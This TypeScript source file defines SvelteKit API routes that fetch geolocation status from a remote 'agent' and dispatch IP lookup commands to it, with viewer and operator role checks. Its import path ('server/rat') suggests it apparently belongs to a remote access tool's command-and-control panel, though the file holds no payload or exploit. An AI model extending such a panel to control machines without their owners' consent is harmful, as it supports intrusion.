import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { requireOperator, requireViewer } from '$lib/server/authorization';
import { dispatchGeoCommand, GeoLookupAgentError } from '$lib/server/rat/ip-geolocation';
import {
  geoCommandRequestSchema,
  type GeoLookupResult,
  type GeoStatus,
} from '$lib/types/ip-geolocation';

export const GET: RequestHandler = async ({ params, locals }) => {
  const id = params.id;
  if (!id) {
    throw error(400, 'Missing agent identifier');
  }

  requireViewer(locals.user);

  try {
    const status = await dispatchGeoCommand(id, { action: 'status' });
    return json(status satisfies GeoStatus);
  } catch (err) {
    if (err instanceof GeoLookupAgentError) {
      throw error(err.status, err.message);
    }
    throw error(500, 'Failed to load geolocation status');
  }
};

export const POST: RequestHandler = async ({ params, request, locals }) => {
  const id = params.id;
  if (!id) {
    throw error(400, 'Missing agent identifier');
  }

  const user = requireOperator(locals.user);

  let payload: unknown;
  try {
    payload = await request.json();
  } catch {
    throw error(400, 'Invalid geolocation payload');
  }

  const command = geoCommandRequestSchema.parse(payload);
  if (command.action !== 'lookup') {
    throw error(405, 'Unsupported geolocation operation');
  }

  const normalized = {
    ...command,
    ip: command.ip.trim(),
    includeTimezone: command.includeTimezone ?? false,
    includeMap: command.includeMap ?? false,
  } as typeof command;

  if (normalized.ip.length === 0) {
    throw error(400, 'IP address is required for lookup');
  }

  try {
    const result = await dispatchGeoCommand(id, normalized, {
      operatorId: user.id,
    });
    return json(result satisfies GeoLookupResult);
  } catch (err) {
    if (err instanceof GeoLookupAgentError) {
      throw error(err.status, err.message);
    }
    throw error(500, 'Failed to resolve IP metadata');
  }
};

